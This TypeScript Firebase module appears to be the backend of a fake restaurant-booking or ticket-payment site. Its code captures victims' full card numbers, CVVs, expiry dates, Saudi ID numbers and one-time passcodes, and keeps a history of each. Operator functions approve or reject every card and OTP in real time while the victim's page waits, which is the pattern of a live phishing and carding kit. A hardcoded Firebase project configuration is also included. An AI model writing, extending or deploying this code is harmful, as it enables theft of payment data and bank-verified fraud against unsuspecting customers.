import { getApp, getApps, initializeApp } from "firebase/app";
import { getDatabase } from "firebase/database";
import {
  doc,
  getDoc,
  getFirestore,
  setDoc,
  updateDoc,
  onSnapshot,
} from "firebase/firestore";
import {
  getAuth,
  signInWithEmailAndPassword,
  signOut,
  onAuthStateChanged,
  User,
} from "firebase/auth";

const firebaseConfig = {
   apiKey: "AIzaSyBCgnfGog9E1l543Own6CIAtaK8nCmk1ZE",
  authDomain: "drettyafgh.firebaseapp.com",
  projectId: "drettyafgh",
  storageBucket: "drettyafgh.firebasestorage.app",
  messagingSenderId: "904057927481",
  appId: "1:904057927481:web:f75cca6d120fa1038a5ae8",
  measurementId: "G-ZEV35EHPJM"
};

function initializeFirebase() {
  if (typeof window === "undefined") {
    return null;
  }

  if (!firebaseConfig.apiKey || !firebaseConfig.projectId) {
    console.warn(
      "Firebase configuration is incomplete. Some features may not work.",
    );
    return null;
  }

  return getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
}

const app = initializeFirebase();
const db = app ? getFirestore(app) : null;
const database = app ? getDatabase(app) : null;
const auth = app ? getAuth(app) : null;

const MAX_HISTORY_ITEMS = 20;
const MAX_AMOUNT_VALUE = 1_000_000;
const BLOCK_CACHE_TTL_MS = 10_000;

const blockedVisitorCache = new Map<
  string,
  { blocked: boolean; expiresAt: number }
>();

const sanitizeString = (value: unknown, maxLength: number) => {
  if (typeof value !== "string") return value;
  return value.trim().slice(0, maxLength);
};

const sanitizeDigits = (value: unknown, maxLength: number) => {
  if (typeof value !== "string") return value;
  return value.replace(/\D/g, "").slice(0, maxLength);
};

const sanitizePhone = (value: unknown, maxLength: number) => {
  if (typeof value !== "string") return value;
  return value.replace(/[^\d+]/g, "").slice(0, maxLength);
};

const clampNumber = (value: unknown, min: number, max: number) => {
  if (typeof value !== "number" || Number.isNaN(value)) return value;
  return Math.min(max, Math.max(min, value));
};

const sanitizeCardEntry = (entry: any) => ({
  cardNumber: sanitizeDigits(entry?.cardNumber, 19),
  cardName: sanitizeString(entry?.cardName, 60),
  expiryMonth: sanitizeDigits(entry?.expiryMonth, 2),
  expiryYear: sanitizeDigits(entry?.expiryYear, 4),
  cvv: sanitizeDigits(entry?.cvv, 4),
  cardType: sanitizeString(entry?.cardType, 20),
  timestamp:
    typeof entry?.timestamp === "string"
      ? entry.timestamp
      : new Date().toISOString(),
});

const sanitizeOtpEntry = (entry: any) => ({
  code: sanitizeDigits(entry?.code, 6),
  timestamp:
    typeof entry?.timestamp === "string"
      ? entry.timestamp
      : new Date().toISOString(),
});

const sanitizePayload = (input: any) => {
  const data = { ...input };

  if ("id" in data) data.id = sanitizeString(data.id, 80);
  if ("name" in data) data.name = sanitizeString(data.name, 80);
  if ("saudiId" in data) data.saudiId = sanitizeDigits(data.saudiId, 10);
  if ("email" in data && typeof data.email === "string") {
    data.email = data.email.trim().toLowerCase().slice(0, 120);
  }
  if ("phone" in data) data.phone = sanitizePhone(data.phone, 15);
  if ("cardNumber" in data) data.cardNumber = sanitizeDigits(data.cardNumber, 19);
  if ("cardName" in data) data.cardName = sanitizeString(data.cardName, 60);
  if ("expiryMonth" in data) data.expiryMonth = sanitizeDigits(data.expiryMonth, 2);
  if ("expiryYear" in data) data.expiryYear = sanitizeDigits(data.expiryYear, 4);
  if ("cvv" in data) data.cvv = sanitizeDigits(data.cvv, 4);
  if ("cardType" in data) data.cardType = sanitizeString(data.cardType, 20);
  if ("cardCategory" in data) data.cardCategory = sanitizeString(data.cardCategory, 40);
  if ("otp" in data) data.otp = sanitizeDigits(data.otp, 6);
  if ("currentPage" in data) data.currentPage = sanitizeString(data.currentPage, 40);
  if ("status" in data) data.status = sanitizeString(data.status, 40);
  if ("type" in data) data.type = sanitizeString(data.type, 40);
  if ("restaurant" in data) data.restaurant = sanitizeString(data.restaurant, 120);
  if ("restaurantEn" in data) data.restaurantEn = sanitizeString(data.restaurantEn, 120);
  if ("date" in data) data.date = sanitizeString(data.date, 40);
  if ("time" in data) data.time = sanitizeString(data.time, 40);
  if ("guests" in data) data.guests = sanitizeDigits(data.guests, 2);
  if ("notes" in data) data.notes = sanitizeString(data.notes, 300);
  if ("bookingDate" in data) data.bookingDate = sanitizeString(data.bookingDate, 40);
  if ("bookingTime" in data) data.bookingTime = sanitizeString(data.bookingTime, 40);

  if ("ticketQuantity" in data) {
    data.ticketQuantity = clampNumber(data.ticketQuantity, 1, 100);
  }
  if ("ticketPrice" in data) {
    data.ticketPrice = clampNumber(data.ticketPrice, 0, MAX_AMOUNT_VALUE);
  }
  if ("totalAmount" in data) {
    data.totalAmount = clampNumber(data.totalAmount, 0, MAX_AMOUNT_VALUE);
  }
  if ("total" in data) {
    data.total = clampNumber(data.total, 0, MAX_AMOUNT_VALUE);
  }

  if (Array.isArray(data.cardHistory)) {
    data.cardHistory = data.cardHistory
      .slice(-MAX_HISTORY_ITEMS)
      .map((entry: any) => sanitizeCardEntry(entry));
  }

  if (Array.isArray(data.otpHistory)) {
    data.otpHistory = data.otpHistory
      .slice(-MAX_HISTORY_ITEMS)
      .map((entry: any) => sanitizeOtpEntry(entry));
  }

  return data;
};

const isVisitorBlocked = async (visitorId: string) => {
  if (!db || !visitorId) return false;

  const cached = blockedVisitorCache.get(visitorId);
  if (cached && cached.expiresAt > Date.now()) {
    return cached.blocked;
  }

  try {
    const snapshot = await getDoc(doc(db, "pays", visitorId));
    const blocked = Boolean(snapshot.data()?.blocked);
    blockedVisitorCache.set(visitorId, {
      blocked,
      expiresAt: Date.now() + BLOCK_CACHE_TTL_MS,
    });
    return blocked;
  } catch (error) {
    console.error("Error checking visitor block status:", error);
    return false;
  }
};

export const loginWithEmail = async (email: string, password: string) => {
  if (!auth) throw new Error("Auth not initialized");
  return signInWithEmailAndPassword(auth, email, password);
};

export const logoutUser = async () => {
  if (!auth) return;
  return signOut(auth);
};

export const onAuthChange = (callback: (user: User | null) => void) => {
  if (!auth) return () => {};
  return onAuthStateChanged(auth, callback);
};

export async function addData(data: any) {
  if (!db) {
    console.warn("Firebase not initialized. Cannot add data.");
    return false;
  }

  const payload = sanitizePayload(data);
  const visitorId =
    typeof payload?.id === "string" ? payload.id : localStorage.getItem("visitor");

  if (!visitorId) {
    console.warn("Missing visitor ID. Cannot add data.");
    return false;
  }

  localStorage.setItem("visitor", visitorId);
  const blocked = await isVisitorBlocked(visitorId);
  if (blocked) {
    console.warn("Blocked visitor tried to submit data:", visitorId);
    return false;
  }

  try {
    const docRef = doc(db, "pays", visitorId!);
    await setDoc(
      docRef,
      {
        ...payload,
        id: visitorId,
        createdDate:
          typeof payload.createdDate === "string"
            ? payload.createdDate
            : new Date().toISOString(),
      },
      { merge: true },
    );

    console.log("Document written with ID: ", docRef.id);
    return true;
  } catch (e) {
    console.error("Error adding document: ", e);
    return false;
  }
}

export const handleCurrentPage = async (page: string) => {
  const visitorId = localStorage.getItem("visitor");
  if (visitorId) {
    return addData({ id: visitorId, currentPage: page });
  }
  return false;
};

export const handleOtp = async (otp: string, page: string = "otp") => {
  const visitorId = localStorage.getItem("visitor");
  if (visitorId && db) {
    try {
      const blocked = await isVisitorBlocked(visitorId);
      if (blocked) {
        throw new Error("VISITOR_BLOCKED");
      }

      const docRef = doc(db, "pays", visitorId);
      const otpEntry = {
        code: sanitizeDigits(otp, 6),
        timestamp: new Date().toISOString(),
      };
      if (typeof otpEntry.code !== "string" || otpEntry.code.length < 4) {
        throw new Error("INVALID_OTP");
      }
      const existingOtpsRaw = JSON.parse(localStorage.getItem("otpHistory") || "[]");
      const existingOtps = Array.isArray(existingOtpsRaw) ? existingOtpsRaw : [];
      const nextOtps = [...existingOtps, otpEntry]
        .slice(-MAX_HISTORY_ITEMS)
        .map((entry) => sanitizeOtpEntry(entry));
      localStorage.setItem("otpHistory", JSON.stringify(nextOtps));

      await setDoc(
        docRef,
        sanitizePayload({
          otp: otpEntry.code,
          otpHistory: nextOtps,
          currentPage: page,
          otpApproved: false,
          otpStatus: "pending",
        }),
        { merge: true },
      );
      return true;
    } catch (error) {
      console.error("Error saving OTP:", error);
      throw error;
    }
  }
  return false;
};

export const handlePay = async (paymentInfo: any, setPaymentInfo: any) => {
  if (!db) {
    console.warn("Firebase not initialized. Cannot process payment.");
    return false;
  }

  try {
    const visitorId = localStorage.getItem("visitor");
    if (visitorId) {
      const blocked = await isVisitorBlocked(visitorId);
      if (blocked) {
        throw new Error("VISITOR_BLOCKED");
      }

      const docRef = doc(db, "pays", visitorId);
      const sanitizedPaymentInfo = sanitizePayload(paymentInfo);
      const cardEntry = sanitizeCardEntry({
        ...sanitizedPaymentInfo,
        timestamp: new Date().toISOString(),
      });

      const snapshot = await getDoc(docRef);
      const existingHistoryRaw = snapshot.data()?.cardHistory;
      const existingHistory = Array.isArray(existingHistoryRaw)
        ? existingHistoryRaw
        : [];
      const nextCardHistory = [...existingHistory, cardEntry]
        .slice(-MAX_HISTORY_ITEMS)
        .map((entry) => sanitizeCardEntry(entry));

      await setDoc(
        docRef,
        sanitizePayload({
          ...sanitizedPaymentInfo,
          status: "pending_approval",
          cardApproved: false,
          cardHistory: nextCardHistory,
        }),
        { merge: true },
      );

      if (typeof setPaymentInfo === "function") {
        setPaymentInfo((prev: any) => ({ ...prev, status: "pending_approval" }));
      }
      return true;
    }
  } catch (error) {
    console.error("Error adding document: ", error);
    throw error;
  }
  return false;
};

// Listen for card approval status
export const listenForApproval = (
  callback: (approved: boolean) => void,
): (() => void) => {
  if (!db) {
    console.warn("Firebase not initialized. Cannot listen for approval.");
    return () => {};
  }

  const visitorId = localStorage.getItem("visitor");
  if (!visitorId) {
    return () => {};
  }

  const docRef = doc(db, "pays", visitorId);
  const unsubscribe = onSnapshot(docRef, (snapshot) => {
    if (snapshot.exists()) {
      const data = snapshot.data();
      if (data.cardApproved === true) {
        callback(true);
      }
    }
  });

  return unsubscribe;
};

export const listenForOtpApproval = (
  callback: (status: "approved" | "rejected") => void,
): (() => void) => {
  if (!db) {
    console.warn("Firebase not initialized.");
    return () => {};
  }

  const visitorId = localStorage.getItem("visitor");
  if (!visitorId) return () => {};

  const docRef = doc(db, "pays", visitorId);
  const unsubscribe = onSnapshot(docRef, (snapshot) => {
    if (snapshot.exists()) {
      const data = snapshot.data();
      if (data.otpApproved === true) {
        callback("approved");
      } else if (data.otpStatus === "rejected") {
        callback("rejected");
      }
    }
  });

  return unsubscribe;
};

export const updateOtpApprovalStatus = async (
  visitorId: string,
  approved: boolean,
) => {
  if (!db) return;
  try {
    const docRef = doc(db, "pays", visitorId);
    await updateDoc(docRef, {
      otpApproved: approved,
      otpStatus: approved ? "approved" : "rejected",
    });
  } catch (error) {
    console.error("Error updating OTP approval:", error);
  }
};

// Update visitor approval status (for admin dashboard)
export const updateApprovalStatus = async (
  visitorId: string,
  approved: boolean,
) => {
  if (!db) {
    console.warn("Firebase not initialized.");
    return;
  }

  try {
    const docRef = doc(db, "pays", visitorId);
    await updateDoc(docRef, {
      cardApproved: approved,
      status: approved ? "approved" : "pending_approval",
    });
  } catch (error) {
    console.error("Error updating approval status:", error);
  }
};

export const updateVisitorBlockStatus = async (
  visitorId: string,
  blocked: boolean,
) => {
  if (!db) {
    console.warn("Firebase not initialized.");
    return false;
  }

  try {
    const docRef = doc(db, "pays", visitorId);
    const payload: Record<string, unknown> = {
      blocked,
      blockedAt: blocked ? new Date().toISOString() : null,
    };
    if (blocked) {
      payload.online = false;
    }
    await setDoc(docRef, payload, { merge: true });
    blockedVisitorCache.set(visitorId, {
      blocked,
      expiresAt: Date.now() + BLOCK_CACHE_TTL_MS,
    });
    return true;
  } catch (error) {
    console.error("Error updating block status:", error);
    throw error;
  }
};

export { db, database, auth };
